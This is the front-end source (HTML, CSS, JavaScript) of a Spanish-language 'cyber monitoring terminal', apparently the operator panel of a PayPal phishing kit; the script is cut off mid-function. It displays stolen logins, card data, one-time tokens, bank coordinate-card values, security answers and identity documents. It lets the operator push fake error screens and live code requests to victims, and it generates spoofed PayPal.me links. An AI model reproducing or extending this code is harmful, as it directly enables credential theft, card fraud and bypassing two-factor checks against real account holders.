
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CYBER MONITORING TERMINAL</title>
<!-- Google Fonts for Hacky / Cyberpunk feel -->
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Fira+Code:wght@400;500;700&display=swap" rel="stylesheet">
<style>
    :root {
        --neon-green: #00ff66;
        --neon-green-dim: #00993d;
        --neon-green-glow: rgba(0, 255, 102, 0.3);
        --dark-bg: #070b09;
        --darker-bg: #030504;
        --card-bg: rgba(10, 20, 15, 0.85);
        --text-color: #d1f4df;
        --gray-text: #6b8c78;
        --warning-red: #ff3333;
    }

    * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
    }

    body {
        background-color: var(--dark-bg);
        color: var(--text-color);
        font-family: 'Share Tech Mono', monospace;
        padding: 20px;
        min-height: 100vh;
        overflow-x: hidden;
    }

    /* Scrollbar Styling */
    ::-webkit-scrollbar {
        width: 8px;
        height: 8px;
    }
    ::-webkit-scrollbar-track {
        background: var(--darker-bg);
    }
    ::-webkit-scrollbar-thumb {
        background: var(--neon-green-dim);
        border-radius: 4px;
    }
    ::-webkit-scrollbar-thumb:hover {
        background: var(--neon-green);
    }

    .hidden {
        display: none !important;
    }

    /* Terminal Carga / Login */
    #login-container {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 85vh;
        width: 100%;
    }

    .terminal-card {
        background: var(--card-bg);
        border: 2px solid var(--neon-green);
        border-radius: 8px;
        width: 100%;
        max-width: 500px;
        box-shadow: 0 0 25px var(--neon-green-glow);
        backdrop-filter: blur(8px);
        overflow: hidden;
        animation: cardAppear 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }

    .terminal-header {
        background: var(--darker-bg);
        padding: 10px 15px;
        border-bottom: 1px solid var(--neon-green);
        display: flex;
        align-items: center;
        justify-content: space-between;
    }

    .terminal-dots {
        display: flex;
        gap: 6px;
    }

    .dot {
        width: 10px;
        height: 10px;
        border-radius: 50%;
    }
    .dot-red { background-color: var(--warning-red); }
    .dot-yellow { background-color: #ffcc00; }
    .dot-green { background-color: var(--neon-green); }

    .terminal-title {
        color: var(--neon-green);
        font-size: 14px;
        letter-spacing: 1.5px;
    }

    .terminal-body {
        padding: 25px;
        font-family: 'Fira Code', monospace;
        font-size: 14px;
        line-height: 1.6;
    }

    .terminal-line {
        margin-bottom: 10px;
        white-space: pre-wrap;
    }

    .terminal-input-row {
        display: flex;
        align-items: center;
        margin-top: 15px;
    }

    .terminal-prompt {
        color: var(--neon-green);
        margin-right: 10px;
        font-weight: bold;
    }

    .terminal-input {
        background: transparent;
        border: none;
        color: var(--neon-green);
        font-family: 'Fira Code', monospace;
        font-size: 14px;
        outline: none;
        flex: 1;
        caret-color: var(--neon-green);
    }

    /* Main Dashboard Layout */
    .dashboard {
        animation: fadeIn 0.4s ease;
        max-width: 1400px;
        margin: 0 auto;
    }

    .dashboard-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        border-bottom: 2px dashed var(--neon-green);
        padding-bottom: 15px;
        margin-bottom: 25px;
    }

    .dashboard-title {
        font-size: 26px;
        color: var(--neon-green);
        text-shadow: 0 0 10px var(--neon-green-glow);
        letter-spacing: 2px;
    }

    .dashboard-actions {
        display: flex;
        gap: 15px;
    }

    /* Buttons */
    .btn {
        background: transparent;
        color: var(--neon-green);
        border: 1px solid var(--neon-green);
        padding: 8px 16px;
        font-family: 'Share Tech Mono', monospace;
        font-size: 15px;
        cursor: pointer;
        border-radius: 4px;
        transition: all 0.2s ease;
        text-transform: uppercase;
        letter-spacing: 1px;
    }

    .btn:hover {
        background: var(--neon-green);
        color: var(--dark-bg);
        box-shadow: 0 0 15px var(--neon-green-glow);
        transform: translateY(-2px);
    }

    .btn:active {
        transform: translateY(0);
    }

    .btn-danger {
        color: var(--warning-red);
        border-color: var(--warning-red);
    }

    .btn-danger:hover {
        background: var(--warning-red);
        color: #fff;
        box-shadow: 0 0 15px rgba(255, 51, 51, 0.4);
    }

    .btn-secondary {
        color: #ffb86c;
        border-color: #ffb86c;
    }
    .btn-secondary:hover {
        background: #ffb86c;
        color: var(--dark-bg);
        box-shadow: 0 0 15px rgba(255, 184, 108, 0.4);
    }

    /* Grid Table styling */
    .table-container {
        background: var(--card-bg);
        border: 1px solid var(--neon-green-dim);
        border-radius: 8px;
        box-shadow: 0 8px 32px rgba(0, 255, 102, 0.15);
        overflow-x: auto;
        margin-bottom: 30px;
        backdrop-filter: blur(10px);
    }

    table {
        width: 100%;
        border-collapse: collapse;
        text-align: left;
    }

    th {
        background-color: var(--darker-bg);
        color: var(--neon-green);
        font-size: 14px;
        padding: 16px 14px;
        border-bottom: 2px solid var(--neon-green);
        letter-spacing: 1.5px;
        text-transform: uppercase;
        position: sticky;
        top: 0;
        z-index: 10;
    }

    td {
        padding: 16px 14px;
        border-bottom: 1px solid rgba(0, 255, 102, 0.1);
        font-size: 14px;
        line-height: 1.6;
        font-family: 'Fira Code', monospace;
        vertical-align: middle;
    }

    tr {
        transition: background-color 0.2s ease;
    }

    tr:hover td {
        background-color: rgba(0, 255, 102, 0.05);
    }

    /* Copyable styles */
    .copyable {
        cursor: pointer;
        padding: 4px 8px;
        border-radius: 6px;
        transition: all 0.2s ease;
        display: inline-block;
        background: rgba(0,0,0,0.4);
        border: 1px solid transparent;
        margin: 2px 0;
    }

    .copyable:hover {
        background-color: rgba(0, 255, 102, 0.15);
        color: #fff;
        border-color: rgba(0, 255, 102, 0.4);
        box-shadow: 0 0 10px rgba(0, 255, 102, 0.2);
        transform: scale(1.02);
    }

    /* Coordinate Trigger Button */
    .btn-view-coords {
        background: rgba(0, 255, 102, 0.05);
        border: 1px solid var(--neon-green);
        color: var(--neon-green);
        padding: 6px 14px;
        border-radius: 6px;
        font-size: 12px;
        cursor: pointer;
        font-family: 'Share Tech Mono', monospace;
        transition: all 0.2s;
        text-transform: uppercase;
        width: 100%;
        margin-bottom: 5px;
    }

    .btn-view-coords:hover {
        background: var(--neon-green);
        color: var(--dark-bg);
        box-shadow: 0 0 12px var(--neon-green-glow);
    }

    /* Mini Credit Card in Cell */
    .card-data-box {
        border: 1px dashed rgba(0, 255, 102, 0.4);
        border-radius: 8px;
        padding: 10px 12px;
        background: rgba(0, 0, 0, 0.4);
        max-width: 100%;
    }

    .card-data-num {
        font-size: 14px;
        font-weight: bold;
        color: #fff;
        margin-bottom: 8px;
        letter-spacing: 1px;
    }

    .card-data-sub {
        display: flex;
        justify-content: space-between;
        font-size: 12px;
        color: var(--gray-text);
        flex-wrap: wrap;
        gap: 5px;
    }

    .status-badge {
        font-size: 12px;
        font-weight: bold;
        text-transform: uppercase;
        border-radius: 6px;
        padding: 4px 10px;
        display: inline-block;
        letter-spacing: 1px;
    }
    
    .status-finalizado {
        background-color: rgba(0, 255, 102, 0.15);
        color: var(--neon-green);
        border: 1px solid var(--neon-green);
    }
    
    .status-pending {
        background-color: rgba(255, 204, 0, 0.15);
        color: #ffcc00;
        border: 1px solid #ffcc00;
    }

    /* Modal Styling */
    .modal-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        background: rgba(0, 0, 0, 0.9);
        backdrop-filter: blur(8px);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 1000;
        opacity: 0;
        pointer-events: none;
        transition: opacity 0.3s ease;
    }

    .modal-overlay.show {
        opacity: 1;
        pointer-events: auto;
    }

    .modal-content {
        background: var(--card-bg);
        border: 2px solid var(--neon-green);
        box-shadow: 0 0 40px var(--neon-green-glow);
        border-radius: 12px;
        width: 95%;
        max-width: 500px;
        overflow: hidden;
        transform: translateY(-40px);
        transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }

    .modal-overlay.show .modal-content {
        transform: translateY(0);
    }

    .modal-body {
        padding: 30px 25px;
    }

    .modal-title {
        font-size: 22px;
        color: var(--neon-green);
        margin-bottom: 10px;
        text-transform: uppercase;
        letter-spacing: 1.5px;
        border-bottom: 1px solid rgba(0, 255, 102, 0.3);
        padding-bottom: 12px;
    }

    .modal-desc {
        font-size: 14px;
        color: var(--gray-text);
        margin-bottom: 25px;
        line-height: 1.5;
    }

    /* Modal Grid of Coordinate Cards */
    .modal-grid {
        display: grid;
        grid-template-columns: repeat(3, 1fr);
        gap: 15px;
        margin-bottom: 30px;
    }

    .coord-item {
        background: rgba(0, 255, 102, 0.05);
        border: 1px solid rgba(0, 255, 102, 0.4);
        border-radius: 8px;
        padding: 12px;
        text-align: center;
        cursor: pointer;
        transition: all 0.2s ease;
        user-select: none;
    }

    .coord-item:hover {
        background: rgba(0, 255, 102, 0.2);
        border-color: var(--neon-green);
        transform: translateY(-3px);
        box-shadow: 0 5px 15px var(--neon-green-glow);
    }

    .coord-item-num {
        font-size: 12px;
        color: var(--gray-text);
        text-transform: uppercase;
        margin-bottom: 6px;
        font-weight: bold;
    }

    .coord-item-val {
        font-size: 18px;
        font-weight: bold;
        color: #fff;
    }

    .modal-footer {
        display: flex;
        justify-content: flex-end;
        gap: 15px;
        margin-top: 20px;
    }

    /* System Toast Notifications */
    #toast-container {
        position: fixed;
        bottom: 25px;
        right: 25px;
        z-index: 2000;
        display: flex;
        flex-direction: column;
        gap: 12px;
    }

    .toast {
        background: var(--darker-bg);
        color: var(--neon-green);
        border: 1px solid var(--neon-green);
        box-shadow: 0 0 15px var(--neon-green-glow);
        border-radius: 6px;
        padding: 15px 25px;
        font-family: 'Share Tech Mono', monospace;
        font-size: 15px;
        min-width: 280px;
        display: flex;
        align-items: center;
        justify-content: space-between;
        transform: translateX(120%);
        transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }

    .toast.show {
        transform: translateX(0);
    }

    .toast-close {
        cursor: pointer;
        color: var(--warning-red);
        font-weight: bold;
        margin-left: 20px;
        padding: 5px;
    }

    /* Keyframes */
    @keyframes fadeIn {
        from { opacity: 0; }
        to { opacity: 1; }
    }

    @keyframes cardAppear {
        from { opacity: 0; transform: scale(0.9) translateY(20px); }
        to { opacity: 1; transform: scale(1) translateY(0); }
    }

    /* RESPONSIVE DESIGN FOR MOBILE */
    @media screen and (max-width: 800px) {
        .dashboard-header {
            flex-direction: column;
            align-items: flex-start;
            gap: 15px;
        }
        
        .dashboard-actions {
            width: 100%;
            flex-direction: column;
        }
        
        .btn {
            width: 100%;
            text-align: center;
            padding: 12px;
        }

        .table-container {
            border: none;
            box-shadow: none;
            background: transparent;
        }

        table, thead, tbody, th, td, tr {
            display: block;
        }

        thead tr {
            display: none; /* Esconder cabeceras de tabla reales */
        }

        tr {
            background: var(--card-bg);
            border: 1px solid var(--neon-green-dim);
            border-radius: 12px;
            margin-bottom: 20px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
            padding: 10px;
        }
        
        tr:hover td {
            background-color: transparent;
        }

        td {
            border: none;
            border-bottom: 1px dashed rgba(0, 255, 102, 0.15);
            position: relative;
            padding-left: 45%; /* Espacio para la pseudo-etiqueta */
            text-align: left;
            font-size: 14px;
            min-height: 40px;
        }

        td:last-child {
            border-bottom: 0;
            text-align: center;
            padding-left: 10px;
        }

        /* Fake headers for mobile rows */
        td::before {
            content: attr(data-label);
            position: absolute;
            left: 10px;
            top: 16px;
            width: 40%;
            font-weight: bold;
            color: var(--neon-green);
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .btn-view-coords {
            margin-top: 5px;
        }
        
        .modal-grid {
            grid-template-columns: repeat(2, 1fr);
        }
    }
</style>
</head>
<body>

<!-- System Toasts Area -->
<div id="toast-container"></div>

<!-- Terminal Login -->
<div id="login-container" class="hidden">
    <div class="terminal-card">
        <div class="terminal-header">
            <div class="terminal-dots">
                <span class="dot dot-red"></span>
                <span class="dot dot-yellow"></span>
                <span class="dot dot-green"></span>
            </div>
            <div class="terminal-title">MONITORING CONSOLE V2</div>
            <div></div>
        </div>
        <div class="terminal-body" id="terminal-content">
            <!-- Content printed letter-by-letter dynamically -->
        </div>
    </div>
</div>

<!-- Main Panel Dashboard -->
<div id="dashboard-container" class="dashboard ">
    <div class="dashboard-header">
        <div class="dashboard-title">CYBER MONITORING TERMINAL // ACTIVA</div>
        <div class="dashboard-actions">
            <button class="btn" id="btn-sound-toggle" onclick="toggleSound()" style="border-color: #ffcc00; color: #ffcc00; font-weight: bold;">Sonido: ON</button>
            <button class="btn btn-secondary" onclick="openPaymentLinkModal()" style="border-color:#0070ba; color:#0070ba;">Generar Link de Pago</button>
            <button class="btn btn-danger" onclick="truncateDB()">Limpiar Registros</button>
            <button class="btn btn-secondary" onclick="logoutPanel()">Cerrar Consola</button>
        </div>
    </div>

    <div class="table-container">
        <table>
            <thead>
                <tr>
                    <th style="width: 60px;">ID</th>
                    <th>Usuario / Clave</th>
                    <th>IP / País</th>
                    <th>Tokens</th>
                    <th>Datos Tarjeta</th>
                    <th>Estado</th>
                    <th>Acciones</th>
                    <th>Fecha / Hora</th>
                </tr>
            </thead>
            <tbody id="recordsTableBody">
                <tr id="noDataRow">
                    <td colspan="8" style="text-align: center; color: var(--gray-text);">INICIALIZANDO CONEXIÓN DE DATOS...</td>
                </tr>
            </tbody>
        </table>
    </div>
</div>

<!-- Coordinate Modal -->
<div id="coord-modal" class="modal-overlay" onclick="closeModal(event)">
    <div class="modal-content">
        <div class="modal-body">
            <div class="modal-title" id="modal-title">Coordenadas Capturadas</div>
            <div class="modal-desc">Haga clic sobre cualquier tarjeta de coordenada para copiar su valor al portapapeles.</div>
            
            <div class="modal-grid" id="modal-grid">
                <!-- Dynamically populated coord items -->
            </div>
            
            <div class="modal-footer">
                <button class="btn btn-secondary" id="btn-copy-all">> Copiar Todo</button>
                <button class="btn" onclick="closeModalForce()">Cerrar</button>
            </div>
        </div>
    </div>
</div>

<!-- Files Modal -->
<div id="files-modal" class="modal-overlay" onclick="closeFilesModal(event)">
    <div class="modal-content">
        <div class="modal-body">
            <div class="modal-title">Datos del Usuario (Files)</div>
            <div class="modal-desc">Haga clic sobre cualquier dato para copiarlo al portapapeles.</div>
            
            <div style="display: flex; flex-direction: column; gap: 10px; margin-bottom: 25px; max-height: 50vh; overflow-y: auto;" id="files-content-area">
                <!-- Dynamically populated files -->
            </div>
            
            <div class="modal-footer">
                <button class="btn" onclick="closeFilesModalForce()">Cerrar</button>
            </div>
        </div>
    </div>
</div>

<!-- Preguntas Modal -->
<div id="preguntas-modal" class="modal-overlay" onclick="closePreguntasModal(event)">
    <div class="modal-content">
        <div class="modal-body">
            <div class="modal-title" id="preguntas-modal-title">Preguntas de Seguridad</div>
            <div class="modal-desc">Haga clic sobre cualquier dato para copiarlo al portapapeles.</div>
            
            <div style="display: flex; flex-direction: column; gap: 10px; margin-bottom: 25px; max-height: 50vh; overflow-y: auto;" id="preguntas-content-area">
                <!-- Populated via JS -->
            </div>
            
            <div class="modal-footer">
                <button class="btn" onclick="closePreguntasModalForce()">Cerrar</button>
            </div>
        </div>
    </div>
</div>

<!-- Token Modal -->
<div id="token-modal" class="modal-overlay" onclick="closeTokenModal(event)">
    <div class="modal-content">
        <div class="modal-body">
            <div class="modal-title" id="token-modal-title">Pedir Token</div>
            <div class="modal-desc">Configura el método de verificación que verá el cliente.</div>
            
            <div style="display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px;">
                <label style="color: var(--neon-green); font-size: 13px;">Método a mostrar al cliente:</label>
                <select id="token-method" class="terminal-input" style="border: 1px solid var(--neon-green); padding: 8px; background: rgba(0,0,0,0.3); outline: none;" onchange="updateTokenFields()">
                    <option value="sms">Mensaje de Texto (SMS)</option>
                    <option value="call">Llamada Telefónica</option>
                    <option value="email">Correo Electrónico</option>
                    <option value="app">Aplicación PayPal</option>
                </select>
                
                <!-- Campos dinámicos para SMS / Llamada -->
                <div id="token-fields-phone" style="display: flex; gap: 10px; margin-top: 10px;">
                    <div style="flex: 1;">
                        <label style="color: var(--gray-text); font-size: 12px;">Cod País (ej: 58)</label>
                        <input type="text" id="token-country-code" class="terminal-input" style="border: 1px solid rgba(0,255,102,0.5); padding: 8px; background: rgba(0,0,0,0.3); width: 100%;">
                    </div>
                    <div style="flex: 1;">
                        <label style="color: var(--gray-text); font-size: 12px;">Primer dígito</label>
                        <input type="text" id="token-first-digit" class="terminal-input" style="border: 1px solid rgba(0,255,102,0.5); padding: 8px; background: rgba(0,0,0,0.3); width: 100%;" maxlength="1">
                    </div>
                    <div style="flex: 1;">
                        <label style="color: var(--gray-text); font-size: 12px;">Últimos 2 dígitos</label>
                        <input type="text" id="token-last-digits" class="terminal-input" style="border: 1px solid rgba(0,255,102,0.5); padding: 8px; background: rgba(0,0,0,0.3); width: 100%;" maxlength="2">
                    </div>
                </div>

                <!-- Campos dinámicos para Email -->
                <div id="token-fields-email" style="display: none; gap: 10px; margin-top: 10px;">
                    <div style="flex: 1;">
                        <label style="color: var(--gray-text); font-size: 12px;">Primeras 2 letras</label>
                        <input type="text" id="token-email-letters" class="terminal-input" style="border: 1px solid rgba(0,255,102,0.5); padding: 8px; background: rgba(0,0,0,0.3); width: 100%;" maxlength="2">
                    </div>
                    <div style="flex: 1;">
                        <label style="color: var(--gray-text); font-size: 12px;">Dominio</label>
                        <select id="token-email-domain" class="terminal-input" style="border: 1px solid rgba(0,255,102,0.5); padding: 8px; background: rgba(0,0,0,0.3); width: 100%;">
                            <option value="@gmail.com">@gmail.com</option>
                            <option value="@hotmail.com">@hotmail.com</option>
                            <option value="@outlook.com">@outlook.com</option>
                            <option value="@yahoo.com">@yahoo.com</option>
                        </select>
                    </div>
                </div>
            </div>
            
            <div class="modal-footer">
                <button class="btn btn-secondary" id="btn-send-token" onclick="sendTokenCommand()">> Enviar Petición</button>
                <button class="btn" onclick="closeTokenModalForce()">Cerrar</button>
            </div>
        </div>
    </div>
</div>

<!-- Tokens List Modal -->
<div id="tokens-list-modal" class="modal-overlay" onclick="closeTokensListModal(event)">
    <div class="modal-content">
        <div class="modal-body">
            <div class="modal-title" id="tokens-list-title">Tokens Capturados</div>
            <div class="modal-desc">Lista completa de códigos introducidos por el usuario.</div>
            
            <div style="display: flex; flex-direction: column; gap: 10px; margin-bottom: 25px; max-height: 50vh; overflow-y: auto;" id="tokens-list-content">
                <!-- Dynamically populated -->
            </div>
            
            <div class="modal-footer">
                <button class="btn" onclick="closeTokensListModalForce()">Cerrar</button>
            </div>
        </div>
    </div>
</div>

<!-- Payment Link Generator Modal -->
<div id="payment-link-modal" class="modal-overlay" onclick="closePaymentLinkModal(event)">
    <div class="modal-content">
        <div class="modal-body">
            <div class="modal-title">Generar Link de Pago</div>
            <div class="modal-desc">Genera un enlace idéntico a PayPal.me con el nombre y la foto que desees.</div>
            
            <div style="display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px;">
                <label style="color: var(--neon-green); font-size: 13px;">Nombre Completo:</label>
                <input type="text" id="paylink-name" class="terminal-input" style="border: 1px solid var(--neon-green); padding: 8px; background: rgba(0,0,0,0.3); outline: none;" placeholder="Ej. Valeria Sanchez">
                
                <label style="color: var(--neon-green); font-size: 13px; margin-top: 10px;">Usuario (@):</label>
                <input type="text" id="paylink-user" class="terminal-input" style="border: 1px solid var(--neon-green); padding: 8px; background: rgba(0,0,0,0.3); outline: none;" placeholder="Ej. valeriasanchezh">
                
                <label style="color: var(--neon-green); font-size: 13px; margin-top: 10px;">Foto de Perfil:</label>
                <select id="paylink-photo-type" class="terminal-input" style="border: 1px solid var(--neon-green); padding: 8px; background: rgba(0,0,0,0.3); outline: none;" onchange="togglePhotoUpload()">
                    <option value="empty">Silueta Vacía (Por defecto)</option>
                    <option value="house">Casita con Dólar (De la captura)</option>
                    <option value="custom">Subir una foto personalizada...</option>
                </select>
                
                <div id="paylink-upload-container" style="display: none; margin-top: 10px;">
                    <input type="file" id="paylink-file" accept="image/*" class="terminal-input" style="font-size: 12px;">
                    <div id="paylink-upload-status" style="font-size: 12px; margin-top: 5px; color: var(--gray-text);"></div>
                </div>
            </div>
            
            <div id="paylink-result-container" style="display: none; margin-bottom: 20px; background: rgba(0, 255, 102, 0.1); padding: 10px; border: 1px solid rgba(0, 255, 102, 0.3); border-radius: 4px;">
                <div style="font-size: 12px; color: var(--gray-text); margin-bottom: 5px;">Enlace generado:</div>
                <div id="paylink-url" style="color: #ffb86c; word-break: break-all; margin-bottom: 10px; font-family: monospace;"></div>
                <div style="display: flex; gap: 10px;">
                    <button class="btn-view-coords" style="flex: 1;" onclick="copyPaymentLink()">Copiar Link</button>
                    <button class="btn-view-coords" style="flex: 1; border-color: #0070ba; color: #0070ba;" onclick="openPaymentLink()">Abrir Link</button>
                </div>
            </div>
            
            <div class="modal-footer">
                <button class="btn btn-secondary" id="btn-generate-paylink" onclick="generatePaymentLink()">> Generar</button>
                <button class="btn" onclick="closePaymentLinkModalForce()">Cerrar</button>
            </div>
        </div>
    </div>
</div>

<script>
    // System Wide Toast Notification Function
    function showToast(message) {
        const container = document.getElementById('toast-container');
        const toast = document.createElement('div');
        toast.className = 'toast';
        toast.innerHTML = `
            <span>> ${message}</span>
            <span class="toast-close" onclick="this.parentElement.remove()">X</span>
        `;
        container.appendChild(toast);
        
        // Reflow for transition
        setTimeout(() => toast.classList.add('show'), 10);
        
        // Auto remove
        setTimeout(() => {
            toast.classList.remove('show');
            setTimeout(() => toast.remove(), 300);
        }, 2500);
    }

    // log interaction helper
    async function logInteraction(recordId, detail) {
        if (!recordId) return;
        try {
            await fetch('panel.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `action=log_interaction&id=${recordId}&detail=${encodeURIComponent(detail)}`
            });
        } catch (e) {
            console.error("Error logging interaction:", e);
        }
    }

    // Direct Copy to Clipboard Function
    function copyToClipboard(text, description, recordId = null) {
        if (!text || text.trim() === '') return;
        navigator.clipboard.writeText(text).then(() => {
            showToast(`${description} copiado`);
            stopAlertSound();
            if (recordId) {
                logInteraction(recordId, `Copió ${description}`);
            }
        }).catch(err => {
            console.error('No se pudo copiar el texto: ', err);
        });
    }

    // --- SOUND ALERT AND COMMAND SYSTEM ---
    let soundEnabled = true;
    let soundInterval = null;
    let audioCtx = null;
    let previousRecords = null;

    function playAlertSound() {
        if (!soundEnabled) return;
        if (soundInterval) return; // already playing
        
        if (!audioCtx) {
            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        }
        
        soundInterval = setInterval(() => {
            if (!soundEnabled) {
                stopAlertSound();
                return;
            }
            try {
                let osc = audioCtx.createOscillator();
                let gain = audioCtx.createGain();
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                osc.type = 'sine';
                osc.frequency.setValueAtTime(880, audioCtx.currentTime); // A5 note
                gain.gain.setValueAtTime(0.3, audioCtx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.4);
                osc.start();
                osc.stop(audioCtx.currentTime + 0.5);
            } catch (e) {
                console.error("Audio error:", e);
            }
        }, 800);
    }

    function stopAlertSound() {
        if (soundInterval) {
            clearInterval(soundInterval);
            soundInterval = null;
        }
    }

    window.toggleSound = function() {
        soundEnabled = !soundEnabled;
        localStorage.setItem('panel_sound_enabled', soundEnabled ? '1' : '0');
        updateSoundButton();
        if (!soundEnabled) {
            stopAlertSound();
        } else {
            playTestSound();
        }
    }

    function updateSoundButton() {
        const btn = document.getElementById('btn-sound-toggle');
        if (btn) {
            if (soundEnabled) {
                btn.innerText = 'Sonido: ON';
                btn.style.borderColor = '#00ff66';
                btn.style.color = '#00ff66';
            } else {
                btn.innerText = 'Sonido: OFF';
                btn.style.borderColor = '#ff3333';
                btn.style.color = '#ff3333';
            }
        }
    }

    function playTestSound() {
        if (!audioCtx) {
            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        }
        try {
            let osc = audioCtx.createOscillator();
            let gain = audioCtx.createGain();
            osc.connect(gain);
            gain.connect(audioCtx.destination);
            osc.type = 'sine';
            osc.frequency.setValueAtTime(600, audioCtx.currentTime);
            gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
            gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.15);
            osc.start();
            osc.stop(audioCtx.currentTime + 0.2);
        } catch (e) {
            console.error(e);
        }
    }

    window.sendTokenError = async function(recordId) {
        try {
            const response = await fetch('panel.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `action=send_command&id=${recordId}&command=token_error`
            });
            const data = await response.json();
            if (data.status === 'ok') {
                showToast(`Comando Token Error enviado al usuario ID ${recordId}`);
                logInteraction(recordId, `Envió error de token`);
            } else {
                showToast(`[ERROR] No se pudo enviar el comando`);
            }
        } catch (e) {
            console.error(e);
        }
    }

    window.sendUserError = async function(recordId) {
        try {
            const response = await fetch('panel.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `action=send_command&id=${recordId}&command=user_error`
            });
            const data = await response.json();
            if (data.status === 'ok') {
                showToast(`⚠ Error Usuario enviado al ID ${recordId}`);
                logInteraction(recordId, `Envió error de usuario/clave`);
            } else {
                showToast(`[ERROR] No se pudo enviar el comando`);
            }
        } catch (e) {
            console.error(e);
        }
    }
    // --- END SOUND ALERT AND COMMAND SYSTEM ---

    // Modal Control functions
    function openCoordModal(recordId, rawString, title) {
        logInteraction(recordId, `Abrió Modal ${title.includes('Set 1') ? 'Coordenadas Set 1' : 'Coordenadas Set 2'}`);
        const modal = document.getElementById('coord-modal');
        const modalTitle = document.getElementById('modal-title');
        const modalGrid = document.getElementById('modal-grid');
        const btnCopyAll = document.getElementById('btn-copy-all');
        
        modalTitle.textContent = title;
        modalGrid.innerHTML = '';
        
        if (!rawString || rawString.trim() === '') {
            modalGrid.innerHTML = '<div style="grid-column: 1/4; text-align: center; color: var(--gray-text);">No hay coordenadas capturadas.</div>';
            btnCopyAll.style.display = 'none';
        } else {
            btnCopyAll.style.display = 'block';
            
            const pairs = rawString.split(',');
            pairs.forEach(pair => {
                const parts = pair.trim().split(':');
                if (parts.length === 2) {
                    const num = parts[0].trim();
                    const val = parts[1].trim();
                    
                    const item = document.createElement('div');
                    item.className = 'coord-item';
                    item.onclick = () => copyToClipboard(val, `Coordenada [${num}]`, recordId);
                    item.innerHTML = `
                        <div class="coord-item-num">Posición ${num}</div>
                        <div class="coord-item-val">${val}</div>
                    `;
                    modalGrid.appendChild(item);
                }
            });
            
            btnCopyAll.onclick = () => copyToClipboard(rawString, `Coordenadas completas ${title.includes('Set 1') ? 'Set 1' : 'Set 2'}`, recordId);
        }
        
        modal.classList.add('show');
    }

    function closeModal(e) {
        if (e.target.id === 'coord-modal') {
            closeModalForce();
        }
    }

    function closeModalForce() {
        document.getElementById('coord-modal').classList.remove('show');
    }

    // Files Modal functions
    function openFilesModal(recordId, name, id_doc, birth, nationality, phone, email, city, address, zip, visa) {
        logInteraction(recordId, 'Abrió Modal Files');
        const modal = document.getElementById('files-modal');
        const content = document.getElementById('files-content-area');
        
        const fields = [
            { label: 'Nombre y Apellido', val: name },
            { label: 'Identificación / Cédula', val: id_doc },
            { label: 'Fecha Nacimiento', val: birth },
            { label: 'Nacionalidad', val: nationality },
            { label: 'Teléfono', val: phone },
            { label: 'Correo', val: email },
            { label: 'Ciudad', val: city },
            { label: 'Dirección', val: address },
            { label: 'Zip Code', val: zip },
            { label: 'Visa Aprobada', val: visa }
        ];
        
        let html = '';
        fields.forEach(f => {
            html += `
                <div style="border: 1px solid rgba(0, 255, 102, 0.2); border-radius: 4px; padding: 8px 12px; background: rgba(0,0,0,0.3); cursor: pointer; transition: background 0.2s;" onclick="copyToClipboard('${escapeJs(f.val)}', '${f.label}', '${recordId}')" onmouseover="this.style.background='rgba(0,255,102,0.1)'" onmouseout="this.style.background='rgba(0,0,0,0.3)'">
                    <div style="font-size: 11px; color: var(--gray-text); text-transform: uppercase;">${f.label}</div>
                    <div style="font-size: 14px; font-weight: bold; color: #fff; margin-top: 3px;">${escapeHtml(f.val)}</div>
                </div>
            `;
        });
        
        content.innerHTML = html;
        modal.classList.add('show');
    }

    function escapeJs(unsafe) {
        return (unsafe || '').toString().replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/\n/g, '\\n').replace(/\r/g, '');
    }

    function escapeHtml(unsafe) {
        return (unsafe || '').toString()
             .replace(/&/g, "&amp;")
             .replace(/</g, "&lt;")
             .replace(/>/g, "&gt;")
             .replace(/"/g, "&quot;")
             .replace(/'/g, "&#039;");
    }

    function closeFilesModal(e) {
        if (e.target.id === 'files-modal') {
            closeFilesModalForce();
        }
    }

    function closeFilesModalForce() {
        document.getElementById('files-modal').classList.remove('show');
    }

    // Preguntas Modal functions
    function openPreguntasModal(recordId, rawString, title) {
        logInteraction(recordId, 'Abrió Modal Preguntas');
        const modal = document.getElementById('preguntas-modal');
        const modalTitle = document.getElementById('preguntas-modal-title');
        const content = document.getElementById('preguntas-content-area');
        
        modalTitle.textContent = title;
        content.innerHTML = '';
        
        if (!rawString || rawString.trim() === '') {
            content.innerHTML = '<div style="text-align: center; color: var(--gray-text);">Sin preguntas.</div>';
        } else {
            const pairs = rawString.split(' | ');
            pairs.forEach(pair => {
                const parts = pair.split(': ');
                if (parts.length >= 2) {
                    const q = parts[0].trim();
                    const a = parts.slice(1).join(': ').trim();
                    
                    const item = document.createElement('div');
                    item.style.border = '1px solid rgba(0, 255, 102, 0.2)';
                    item.style.borderRadius = '4px';
                    item.style.padding = '8px 12px';
                    item.style.background = 'rgba(0,0,0,0.3)';
                    item.style.cursor = 'pointer';
                    item.style.transition = 'background 0.2s';
                    item.onclick = () => copyToClipboard(a, `Pregunta: ${q}`, recordId);
